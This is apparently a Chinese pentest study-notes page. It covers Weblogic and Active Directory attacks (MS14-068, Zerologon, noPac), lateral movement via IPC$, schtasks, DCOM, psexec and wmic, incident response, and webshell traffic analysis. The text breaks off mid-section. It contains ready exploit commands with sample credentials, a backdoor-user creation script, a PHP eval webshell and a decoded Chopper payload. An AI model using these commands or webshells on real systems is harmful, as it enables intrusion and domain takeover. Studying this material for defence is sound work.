<h3 id="Weblogic未授权远程命令执行漏洞CVE-2020-14882，CVE-2020-14883"><a href="#Weblogic未授权远程命令执行漏洞CVE-2020-14882，CVE-2020-14883" class="headerlink" title="Weblogic未授权远程命令执行漏洞CVE-2020-14882，CVE-2020-14883"></a>Weblogic未授权远程命令执行漏洞CVE-2020-14882，CVE-2020-14883</h3><p>只能在Weblogic 12.2.1以上版本利用，因为10.3.6并不存在com.tangosol.coherence.mvel2.sh.ShellSession类</p>
<ul>
<li>CVE-2020-14882允许未授权的用户绕过管理控制台的权限验证访问后台</li>
<li>CVE-2020-14883允许后台任意用户通过HTTP协议执行任意命令</li>
</ul>
<h3 id="Weblogic后台war后门文件部署"><a href="#Weblogic后台war后门文件部署" class="headerlink" title="Weblogic后台war后门文件部署"></a>Weblogic后台war后门文件部署</h3><h2 id="打域控的方法"><a href="#打域控的方法" class="headerlink" title="打域控的方法"></a>打域控的方法</h2><h3 id="MS14-068-Kerberos域用户提权漏洞"><a href="#MS14-068-Kerberos域用户提权漏洞" class="headerlink" title="MS14-068 Kerberos域用户提权漏洞"></a>MS14-068 Kerberos域用户提权漏洞</h3><p>前提：</p>
<ol>
<li>域账户</li>
<li>域账户密码</li>
<li>SID</li>
<li>域控IP</li>
</ol>
<p>MS14-068是内网横向PTT攻击的一种</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">MS14-068.exe -u test02@hack.lab -s S-1-5-21-3725850554-4274512539-2478289712-1112 -d 192.168.1.1 -p Test03!@#</span><br></pre></td></tr></table></figure>



<h3 id="域渗透Zerologon-Netlogon-CVE-2020-1472"><a href="#域渗透Zerologon-Netlogon-CVE-2020-1472" class="headerlink" title="域渗透Zerologon&#x2F;Netlogon CVE-2020-1472"></a>域渗透Zerologon&#x2F;Netlogon CVE-2020-1472</h3><p>影响MS-NRPC所使用的加密身份验证方案（AES-CFB8）</p>
<blockquote>
<p>AES-CFB8的工作原理是，通过在明文前面添加一个16字节的初始化矢量（IV），然后将AES应用于IV和明文的前16个字节，并采用AES输出的第一个字节，来加密明文的每个字节，然后将其与下一个纯文本字节进行异或</p>
<p>对于256个密钥中的1个，对全零的纯文本应用AESCFB8加密将导致全零的密文，从而启用登录绕过，这就是名称zerologon的来源</p>
</blockquote>
<h3 id="永恒之蓝"><a href="#永恒之蓝" class="headerlink" title="永恒之蓝"></a>永恒之蓝</h3><p>条件：139、445端口开放</p>
<h3 id="nopac-CVE-2021-42278-42287"><a href="#nopac-CVE-2021-42278-42287" class="headerlink" title="nopac  CVE-2021-42278&#x2F;42287"></a>nopac  CVE-2021-42278&#x2F;42287</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#检测</span></span><br><span class="line">./noPac.exe scan -domain test1.local -user kk -pass 123Q</span><br><span class="line"></span><br><span class="line"><span class="comment">#漏洞利用</span></span><br><span class="line">./noPac.exe -domain test1.local -user kk -pass <span class="string">&quot;123QWE..&quot;</span> /dc dc.test1.local /mAccount demo123 /mPassword Password123！/service cifs /ptt</span><br></pre></td></tr></table></figure>



<h3 id="pth-ptk-ptt"><a href="#pth-ptk-ptt" class="headerlink" title="pth&#x2F;ptk&#x2F;ptt"></a>pth&#x2F;ptk&#x2F;ptt</h3><h3 id="smb中继"><a href="#smb中继" class="headerlink" title="smb中继"></a>smb中继</h3><h3 id="ntlm-relay"><a href="#ntlm-relay" class="headerlink" title="ntlm relay"></a>ntlm relay</h3><p>NTLM hash 分为 NTLMv1 NTLMv2 NTLM session v2 三种，NTLMv2 的强度比 NTLMv1 强了不少 ，我们在实战中，如果获得的是NTLMv1的话直接对其进行爆破就行了，而现实情况中我们遇到的是 NTLMv2，NTLMv2的密码强度高了不少，因此如果你没有一个超级强大的字典，你很难得到明文密码，将截获的Net-NTLM Hash重放来进行攻击，从而实现对其他机器的控制</p>
<p>为了重放这个Net-NTLMhash，首先我们要做的就是获取这个Net-NTLMhash。</p>
<p>由于SMB、HTTP、LDAP、MSSQL等协议都可以携带NTLM认证的三类消息，所以只要是使用SMB、HTTP、LDAP、MSSQL等协议来进行NTLM认证的程序，都可以尝试向攻击者发送Net-NTLMhash从而让攻击者截获用户的Net-NTLMhash，也就是说我们可以通过这些协议来进行攻击</p>
<h3 id="adcs域内提权CVE-2022-26923"><a href="#adcs域内提权CVE-2022-26923" class="headerlink" title="adcs域内提权CVE-2022-26923"></a>adcs域内提权CVE-2022-26923</h3><h3 id="域管token横向"><a href="#域管token横向" class="headerlink" title="域管token横向"></a>域管token横向</h3><p>令牌(token)是系统的临时秘钥，相当于账号和密码，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源，这些令牌将持续存在于系统中，除非系统重新启动。令牌最大的特点就是随机性，不可预测，黑客或软件无法猜测出令牌。<br>令牌(token)可以假冒，当我们需要域管理员操作权限时，就可以通过假冒域管理员的令牌进行攻击：<br>这里我们主要说访问令牌(Access Token),在windows中Access Token分为两种：授权令牌(Delegation Token)和模拟令牌(Impresonation Token) ；它们之前的区别就在于前者属于交互式会话登陆，而后者属于非交互的会话，两种Token在系统重启后会清除，但前者的Token用户在注销后，会变成后者。</p>
<p>此方法需要administrator管理员权限，当我们如果只是一个webshell或者user组权限时，是需要先进行提权操作。</p>
<p><strong>token窃取方法</strong></p>
<ol>
<li>incognito.exe：适用于有杀软，不出网，防火墙限制，cs&#x2F;msf无法上线的情况</li>
<li>msf的incognito模块：适用于meterpreter上线后的机器</li>
<li>cs窃取token：steal_token，cs上线后可用</li>
</ol>
<h3 id="打域控开放的服务"><a href="#打域控开放的服务" class="headerlink" title="打域控开放的服务"></a>打域控开放的服务</h3><h3 id="dcom-wmi"><a href="#dcom-wmi" class="headerlink" title="dcom wmi"></a>dcom wmi</h3><h3 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h3><h4 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h4><h3 id="spn漏洞"><a href="#spn漏洞" class="headerlink" title="spn漏洞"></a>spn漏洞</h3><h3 id="CVE-2022-26809"><a href="#CVE-2022-26809" class="headerlink" title="CVE-2022-26809"></a>CVE-2022-26809</h3><h3 id="CVE-2021-1732"><a href="#CVE-2021-1732" class="headerlink" title="CVE-2021-1732"></a>CVE-2021-1732</h3><h2 id="编写exp相关经历"><a href="#编写exp相关经历" class="headerlink" title="编写exp相关经历"></a>编写exp相关经历</h2><ul>
<li></li>
</ul>
<h2 id="windows和linux的应急响应"><a href="#windows和linux的应急响应" class="headerlink" title="windows和linux的应急响应"></a>windows和linux的应急响应</h2><h3 id="研判"><a href="#研判" class="headerlink" title="研判"></a>研判</h3><h4 id="正在被入侵"><a href="#正在被入侵" class="headerlink" title="正在被入侵"></a>正在被入侵</h4><p>若发现攻击者正在进行入侵（web漏洞扫描，弱口令爆破等）：一般情况下都会产生日志，尽量采用远程日志系统（rsylog等），远程日志可以防止黑客删除日志；溯源找到攻击者的源IP，并在防火墙等位置做出相应处置（封堵等）</p>
<h4 id="目的未达成"><a href="#目的未达成" class="headerlink" title="目的未达成"></a>目的未达成</h4><p>若发现攻击者已成功上传木马、后门等，流量数据正在回传的情况：建立内存备份（快照，dump内存等），方便后续进行取证；进行内存取证&#x2F;快照分析，定位到相应的木马文件（webshell，shellcode等）和攻击者利用的漏洞点，进行相关处理（删除或修复），防止二次入侵；根据攻击者的流量分析出攻击者的意图（攻击者想要干什么）；确定攻击者的ip，在防火墙等位置进行相关处理；选择性重启服务器进入安全模式，对相应后门进行排查和删除</p>
<h4 id="目的已达成"><a href="#目的已达成" class="headerlink" title="目的已达成"></a>目的已达成</h4><p>若发现攻击者已经达成目的，删除了相关木马文件和日志：首先定位被入侵的时间点，方便后续针对该时间点进行分析；建立内存备份（快照，dump内存等），方便后续进行取证；定位到被入侵的时间点，查找攻击者的攻击流量并分析，找到相关的木马或后门信息（链接，文件名等）以及利用的漏洞点，确定攻击者的ip；查找系统内对应时间点相关的日志，分析找到相关线索；如果日志被删除，尝试通过硬盘数据备份进行数据恢复</p>
<h3 id="判断误报"><a href="#判断误报" class="headerlink" title="判断误报"></a>判断误报</h3><p>首先分析相关数据包的内容是否为攻击流量（后门，webshell等）；分析报的ip相关的历史流量，是否有过攻击行为；如果没有则可能是误报，不处理（可以误报，但不能漏报）</p>
<h3 id="挖矿病毒排查"><a href="#挖矿病毒排查" class="headerlink" title="挖矿病毒排查"></a>挖矿病毒排查</h3><h4 id="Windows系统"><a href="#Windows系统" class="headerlink" title="Windows系统"></a>Windows系统</h4><ul>
<li>因为挖矿病毒的目的性，决定了挖矿病毒要占用很高的CPU或GPU性能，首先任务管理器结束掉占用高的进程，记录进程名和位置</li>
<li>挖矿病毒需要联网，使用<code>netstat -ano | findstr ESTABLISHED</code> 排查是否存在恶意网络连接</li>
<li>查找有无新增用户<code>net user</code>，查看计划任务是否存在异常</li>
<li>删除相关异常文件，观察是否还存在内存占用高的情况</li>
</ul>
<h4 id="Linux系统"><a href="#Linux系统" class="headerlink" title="Linux系统"></a>Linux系统</h4><ul>
<li>依然是查找占用内存高的进程top、htop等</li>
<li>查看是否有恶意网络连接或未授权的端口监听netstat -antp</li>
<li>通过进程名pid或关键词查找挖矿病毒，大概率在tmp目录下，可直接清空</li>
<li>排查异常用户</li>
<li>排查每个用户的异常定时脚本，查看定时任务<code>crontab -l</code>，删除定时任务<code>crontab -d</code>，重启定时任务服务<code>servcice crond restart</code></li>
<li>观察是否还存在内存占用高的情况</li>
</ul>
<h2 id="溯源方法"><a href="#溯源方法" class="headerlink" title="溯源方法"></a>溯源方法</h2><h3 id="对内溯源"><a href="#对内溯源" class="headerlink" title="对内溯源"></a>对内溯源</h3><p>若攻击者已经成功入侵，首先确认攻击者的思路，从已经上传的工具入手，分析流量。对攻击流量进行阻断，删除相关恶意工具，查看对应的中间件日志，查看请求行为，分析攻击者思路</p>
<h3 id="对外溯源"><a href="#对外溯源" class="headerlink" title="对外溯源"></a>对外溯源</h3><p>确认攻击者的真实信息</p>
<p>一般情况下可以直接拿到的攻击者信息：攻击时间，攻击者ip，受攻击目标，恶意文件（不一定有），通过攻击类型分析攻击详情的请求包，判断是否为真实ip（肉鸡ip）</p>
<p>优先级</p>
<ul>
<li>端口扫描-个人vps&#x2F;空间搜索引擎-优先</li>
<li>命令执行-未隐蔽网络&#x2F;移动网络&#x2F;肉鸡-优先</li>
<li>恶意文件-是否存在未屏蔽的关键信息-优先</li>
</ul>
<p>尽可能还原攻击者画像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">姓名/IP	攻击IP	地理位置	QQ	微信	邮箱	手机号</span><br><span class="line">支付宝	IP地址所属公司	IP地址关联域名	人物照片	</span><br><span class="line">跳板机(可选)</span><br></pre></td></tr></table></figure>



<h2 id="java内存马"><a href="#java内存马" class="headerlink" title="java内存马"></a>java内存马</h2><h3 id="web-xml"><a href="#web-xml" class="headerlink" title="web.xml"></a>web.xml</h3><p>java网站都一定会有一个web容器。listener、filter、servlet都是在web.xml中配置的</p>
<p><a href="https://www.cnblogs.com/hellojava/archive/2012/12/28/2835730.html">https://www.cnblogs.com/hellojava/archive/2012/12/28/2835730.html</a></p>
<h3 id="listener"><a href="#listener" class="headerlink" title="listener"></a>listener</h3><p>监听器，本质上是一个java类，作用是Application、session、request三大对象的创建或者删除，根据监听结果来执行提前编写的代码；简单来说，就是通过监听某个行为，来触发某段代码执行</p>
<h3 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h3><p>筛选器，本质上是一个java类，作用是接收web端的请求并对其进行修改（格式化）和内容判断，变成<strong>servlet</strong>能够接收的数据格式；如果没有filter，则直接将web端的请求发给servlet；可配置多个filter</p>
<h3 id="filter的生命周期"><a href="#filter的生命周期" class="headerlink" title="filter的生命周期"></a>filter的生命周期</h3><p>filter的创建和销毁由web容器负责；web程序启动时创建filter的实例对象，读取web.xml，完成对象的初始化功能</p>
<p>Filter对象创建后会驻留在内存，当web应用移除或服务器停止时才销毁。销毁函数会在Web容器卸载 Filter 对象之前被调用。该方法在Filter的生命周期中仅执行一次。在这个方法中，可以释放过滤器使用的资源。</p>
<h3 id="filterchains"><a href="#filterchains" class="headerlink" title="filterchains"></a>filterchains</h3><p>当存在多个filter的时候就组成了filter链，web服务根据在web.xml中的filter注册顺序进行调用；当第一个Filter的doFilter方法被调用时，web服务器会创建一个代表Filter链的FilterChain，然后调用filterchain中其他filter的filter.doFilter方法</p>
<h3 id="servlet"><a href="#servlet" class="headerlink" title="servlet"></a>servlet</h3><p>本质上是一个java类；由容器进行调度和执行，进行数据处理的核心模块，里面有一个函数services，这个函数是servlet的核心代码，实现servlet的核心功能；所有的servlet在第一次访问的时候创建，直到服务器关闭的时候才销毁。</p>
<h2 id="免杀有无研究"><a href="#免杀有无研究" class="headerlink" title="免杀有无研究"></a>免杀有无研究</h2><p>shellcode分离免杀</p>
<p>硬编码异或免杀</p>
<p>干扰字符免杀</p>
<p>调用冷门函数</p>
<p>加壳，花指令</p>
<p>修改内存特征</p>
<h2 id="域内横向移动的方法"><a href="#域内横向移动的方法" class="headerlink" title="域内横向移动的方法"></a>域内横向移动的方法</h2><h3 id="IPC共享"><a href="#IPC共享" class="headerlink" title="IPC共享"></a>IPC共享</h3><p>条件：开启了139，445端口，开启了IPC$默认共享，知道目标的账户密码</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#建立IPC连接</span></span><br><span class="line">net use \\\\ IP \ipc$ <span class="string">&quot;password&quot;</span> /user:<span class="string">&quot;Administrator&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="at-schtasks"><a href="#at-schtasks" class="headerlink" title="at&#x2F;schtasks"></a>at&#x2F;schtasks</h3><p>at命令在2012之前的系统使用，后面的系统使用schtasks代替</p>
<p>条件：开启了139，445端口，获取了其他主机的明文密码或者hash值</p>
<p>at传递</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">建立ipc连接：net ``use` `\192.168.213.163ipc$ ``<span class="string">&quot;123.com&quot;</span>` `/user:hsyy.comadministrator</span><br><span class="line">本地制作user.bat文件放在本地c盘执行命令脚本：net user haha 123.com /add</span><br><span class="line">将文件上传到对方主机C 盘：``copy` `user.bat \192.168.213.163c$</span><br><span class="line">给对方主机添加命令执行任务：at \192.168.213.163 12:20 c:user.bat</span><br><span class="line">等待后查看到对方主机添加用户haha</span><br></pre></td></tr></table></figure>

<p>schtasks传递</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">创建ipc连接：net ``use` `\192.168.213.163ipc$ ``<span class="string">&quot;123.com&quot;</span>` `/user:hsyy.comadministrator</span><br><span class="line">复制脚本bat文件：``copy` `user.bat \192.168.213.163c$</span><br><span class="line">创建 adduser 任务对应执行文件：schtasks /create /s 192.168.213.163 /ru ``<span class="string">&quot;SYSTEM&quot;</span>` `/tn adduser /sc DAILY /tr c:user.bat /F</span><br><span class="line">执行文件任务：schtasks /run /s 192.168.213.163 /tn adduser /i</span><br><span class="line">删除执行文件任务：schtasks /delect /s 192.168.213.163 /tn adduser /f</span><br></pre></td></tr></table></figure>

<h3 id="pth-ptk-ptt-1"><a href="#pth-ptk-ptt-1" class="headerlink" title="pth ptk ptt"></a>pth ptk ptt</h3><p>常见的有黄金&#x2F;白银票据，哈希传递，ms14-068等，可利用mimikatz</p>
<h3 id="dcom组件"><a href="#dcom组件" class="headerlink" title="dcom组件"></a>dcom组件</h3><p>DCOM（分布式组件对象模型,分布式组件对象模式）是一系列微软的概念和程序接口，利用这个接口，客户端程序对象能够请求来自网络中另一台计算机上的服务器程序对象。DCOM基于组件对象模型（COM），COM提供了一套允许同一台计算机上的客户端和服务器之间进行通信的接口（运行在Windows95或者其后的版本上）。</p>
<p>并不是所有dcom组件都可以执行命令，目前网络上大多使用的是<code>MMC20.APPLICATION</code>来进行横向移动。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-ChildItem &#x27;registry::HKEY_CLASSES_ROOT\WOW6432Node\CLSID\&#123;49B2791A-B1AE-4C90-9B8E-E860BA07F889&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/image/webp.webp" alt="img"></p>
<p>执行远程命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[System.Activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application.1&quot;,&quot;10.92.XXX.XX&quot;)).Document.ActiveView.ExecuteShellCommand(&quot;cmd&quot;,$null,&quot;/c hostname calc.exe&quot;,&quot;7&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="/image/webp.webp" alt="img"></p>
<p><img src="/image/webp-1700808110529-7.webp" alt="img"></p>
<h3 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h3><p>windows SysinternalsSuite攻击套件中的一员，由于文件拥有微软的签名，所以很多杀软都会放行，但是行为很容易检测。metasploit中也集成了psexec工具模块，其实原理是一样的。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">使用：PsExec64.exe \\HOST -u USERNAME -p PASSWORD COMMAND</span><br></pre></td></tr></table></figure>

<h3 id="wmi"><a href="#wmi" class="headerlink" title="wmi"></a>wmi</h3><p>WMI，是Windows 2K&#x2F;XP管理系统的核心；对于其他的Win32操作系统，WMI是一个有用的插件。WMI以CIMOM为基础，CIMOM即公共信息模型对象管理器（Common Information Model Object Manager），是一个描述操作系统构成单元的对象数据库，为MMC和脚本程序提供了一个访问操作系统构成单元的公共接口。有了WMI，工具软件和脚本程序访问操作系统的不同部分时不需要使用不同的API。如今大部分WINDOWS版本的机器都内置了WMI组件，所以利用WMI横向移动是一件很方便的事情。</p>
<p>使用： <code>wmic /node:IP /user:USERNAME /password:PASSWORD process list brief</code></p>
<p>执行命令: <code>wmic /node:IP /user:USERNAME /password:PASSWORD process call create &quot;cmd.exe /c tasklist&quot;</code></p>
<h3 id="WinRM"><a href="#WinRM" class="headerlink" title="WinRM"></a>WinRM</h3><p>Windows 远程管理 (WinRM) 是微软对 WS-Management Protocol（Web Services for Management aka WSMan）的实现，这是一种基于标准简单对象访问协议 (SOAP) 的防火墙友好协议，它允许来自不同硬件和操作系统的供应商，进行互操作。WinRM HTTP 通信通过 TCP 端口 5985 进行，HTTPS (TLS) 通信通过 TCP 端口 5986 进行。WinRM 本身支持 NTLM 和 Kerberos（域）身份验证。初始身份验证后，WinRM 会话受 AES 加密保护。</p>
<h3 id="域内密码喷洒脚本"><a href="#域内密码喷洒脚本" class="headerlink" title="域内密码喷洒脚本"></a>域内密码喷洒脚本</h3><p>用多个弱密码连续爆破同一个服务器会触发策略而锁定登录，这时候可以通过写脚本以一组弱密码批量撞多个服务器（故叫做喷洒脚本）</p>
<h3 id="窃取管理员token横向"><a href="#窃取管理员token横向" class="headerlink" title="窃取管理员token横向"></a>窃取管理员token横向</h3><h2 id="流量特征-webshell客户端等"><a href="#流量特征-webshell客户端等" class="headerlink" title="流量特征 webshell客户端等"></a>流量特征 webshell客户端等</h2><h3 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h3><p>webshell源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>请求侧通信流量</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/test.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>1*.***.*.***</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://1*.***.*.***</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>1*.***.*.***</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>690</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Close</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=m4mi07jn4u6cd3gmhdt97fmq55</span><br><span class="line"></span><br><span class="line"><span class="language-gcode">cmd=<span class="meta">%</span><span class="number">40</span>eval<span class="meta">%</span><span class="number">01</span><span class="meta">%</span><span class="number">28</span>base<span class="number">64</span>_decode<span class="meta">%</span><span class="number">28</span><span class="meta">%</span><span class="number">24</span>_POST<span class="meta">%</span><span class="number">5</span>Bz<span class="number">0</span><span class="meta">%</span><span class="number">5</span>D<span class="meta">%</span><span class="number">29</span><span class="meta">%</span><span class="number">29</span><span class="meta">%</span><span class="number">3</span>B&amp;z<span class="number">0</span>=QGluaV<span class="number">9</span>zZXQoImRpc<span class="number">3</span>BsYXlfZXJyb<span class="number">3</span>JzIiwiMCIp<span class="meta">O0</span>BzZXRfdGltZV<span class="number">9</span>saW<span class="number">1</span>pdCgwKTtAc<span class="number">2</span>V<span class="number">0</span>X<span class="number">21</span>hZ<span class="number">2</span>ljX<span class="number">3</span>F<span class="number">1</span>b<span class="number">3</span>Rlc<span class="number">19</span>ydW<span class="number">50</span>aW<span class="number">1</span>lKDAp<span class="meta">O2</span>Vja<span class="name">G8</span>oIi<span class="number">0</span><span class="meta">%</span><span class="number">2</span>BfCIpOzskRD<span class="number">1</span>kaXJuYW<span class="number">1</span>lKCRfU<span class="number">0</span><span class="attr">VSVkVSWyJTQ1</span>JJUFRfRklMRU<span class="number">5</span>BTUUiXSk<span class="number">7</span>aWYoJEQ<span class="number">9</span>PSIiKSREPWRpc<span class="name">m5</span>hbWUoJF<span class="number">9</span>TRVJWRVJbIlBBVEhfVFJBTl<span class="symbol">NMQVRFRCJdKTskUj0</span>ieyREfVx<span class="number">0</span>IjtpZihzdWJzdHIoJEQsMCwxKSE<span class="number">9</span>Ii<span class="number">8</span>iKXtmb<span class="number">3</span>JlYW<span class="symbol">NoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2</span>RpcigieyRMfToiKSkkUi<span class="number">49</span>I<span class="symbol">nskTH06</span>Ijt<span class="number">9</span>JFIuPSJcdCI<span class="number">7</span>JHU<span class="number">9</span>KGZ<span class="number">1</span>bm<span class="symbol">N0</span>aW<span class="number">9</span>uX<span class="number">2</span>V<span class="number">4</span>aX<span class="symbol">N0</span>cyg<span class="symbol">ncG9</span>zaXhfZ<span class="number">2</span>V<span class="number">0</span>ZWdpZCcpKT<span class="number">9</span>Ac<span class="name">G9</span>zaXhfZ<span class="number">2</span>V<span class="number">0</span>cHd<span class="number">1</span>aWQoQHB<span class="attr">vc2</span>l<span class="number">4</span>X<span class="number">2</span>dldGV<span class="number">1</span>aWQoKSk<span class="number">6</span>Jyc<span class="number">7</span>JHVzcj<span class="number">0</span>oJHUpPyR<span class="number">1</span>WyduYW<span class="number">1</span>lJ<span class="number">106</span>QGdldF<span class="number">9</span>jdXJyZW<span class="number">50</span>X<span class="number">3</span>VzZXIoKTskUi<span class="number">49</span>cGhwX<span class="number">3</span>VuYW<span class="number">1</span>lKCk<span class="number">7</span>JFIuPSIoeyR<span class="number">1</span>c<span class="number">3</span>J<span class="number">9</span>KSI<span class="number">7</span>cHJpb<span class="symbol">nQgJFI7</span><span class="meta">O2</span>Vja<span class="name">G8</span>oI<span class="symbol">nw8</span>LSIp<span class="meta">O2</span>RpZSgpOw<span class="meta">%</span><span class="number">3</span>D<span class="meta">%</span><span class="number">3</span>D</span></span><br></pre></td></tr></table></figure>

<p>流量解码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@eval.(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw==</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(&quot;-&gt;|&quot;);;$D=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);if($D==&quot;&quot;)$D=dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]);$R=&quot;&#123;$D&#125;\t&quot;;if(substr($D,0,1)!=&quot;/&quot;)&#123;foreach(range(&quot;A&quot;,&quot;Z&quot;) as $L)if(is_dir(&quot;&#123;$L&#125;:&quot;))$R.=&quot;&#123;$L&#125;:&quot;;&#125;$R.=&quot;\t&quot;;$u=(function_exists(&#x27;posix_getegid&#x27;))?@posix_getpwuid(@posix_geteuid()):&#x27;&#x27;;$usr=($u)?$u[&#x27;name&#x27;]:@get_current_user();$R.=php_uname();$R.=&quot;(&#123;$usr&#125;)&quot;;print $R;;echo(&quot;|&lt;-&quot;);die();</span><br></pre></td></tr></table></figure>

<p>响应侧通信流量</p>
<p><img src="/image/20210410231149-13042956-9a0f-1.jpg" alt="img"></p>
<p><strong>总结</strong></p>
<ul>
<li>请求侧通信流量存在<code>@eval</code>函数</li>
<li>请求侧流量使用的是base64编码，并且头部有固定QG字段</li>
<li>请求侧默认攻击载荷为z1或者z0</li>
<li>响应侧流量一般包裹在<code>-&gt;|xxxx|&lt;-</code>当中</li>
</ul>
<h3 id="中国蚁剑"><a href="#中国蚁剑" class="headerlink" title="中国蚁剑"></a>中国蚁剑</h3><p>webshell源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span>  <span class="comment">#蚁剑不同的编码器会有不同的代码，这里以普通的分析</span></span><br></pre></td></tr></table></figure>

<p>编码器在发送数据到服务端之前对payload进行相关处理，目的是为了绕过请求侧的流量检测，默认的有：</p>
<ul>
<li>default编码器：不对传输的payload进行任何操作。</li>
<li>base64编码器：对payload进行base64编码。</li>
<li>chr编码器：对payload的所有字符都利用利用chr函数进行转换。</li>
<li>chr16编码器：对payload的所有字符都利用chr函数转换，与chr编码器不同的是chr16编码器对chr函数传递的参数是十六进制。</li>
<li>rot13编码器：对payload中的字母进行rot13转换。</li>
<li>以上五种编码为中国蚁剑自带的，不需要配置就可以直接使用，除此之外，还存在一个RSA编码器，该编码器将</li>
<li>RSA编码器：该编码器默认不展示，需要自己配置。配置方法：在编码管理界面点击生成RSA配置生成公钥、私钥和PHP代码，然后点击新建编码器选择PHP RSA之后输入编码器的名字即可。</li>
</ul>
<p>解码器主要是对接收到的数据进相关处理，目的是为了绕过响应侧的流量检测，默认的解码器：</p>
<ul>
<li>default解码器：不对响应数据进行处理。</li>
<li>base64解码器：将收到的数据进行base64解码。</li>
<li>rot13解码器：将收到的数据进行rot13转换，由于英文字母一共26个所以置换两次之后会还原。</li>
</ul>
<p>请求侧通信流量</p>
<p>默认编码器发送的数据如下：</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210410231150-138e05d6-9a0f-1.jpg"><img src="/image/20210410231150-138e05d6-9a0f-1.jpg" alt="img"></a></p>
<p>base64编码器发送数据如下：</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210410231151-13b74b76-9a0f-1.jpg"><img src="/image/20210410231151-13b74b76-9a0f-1.jpg" alt="img"></a></p>
<p>chr：</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210410231151-13fa7aea-9a0f-1.jpg"><img src="/image/20210410231151-13fa7aea-9a0f-1.jpg" alt="img"></a></p>
<p>chr16：</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210410231151-14398fe6-9a0f-1.jpg"><img src="/image/20210410231151-14398fe6-9a0f-1.jpg" alt="img"></a></p>
<p>rot13:</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210410231152-1461fa6c-9a0f-1.jpg"><img src="/image/20210410231152-1461fa6c-9a0f-1.jpg" alt="img"></a></p>
<p>rsa:</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210410231152-148de50a-9a0f-1.jpg"><img src="/image/20210410231152-148de50a-9a0f-1.jpg" alt="img"></a></p>
<p>响应侧流量</p>
<p>default：</p>
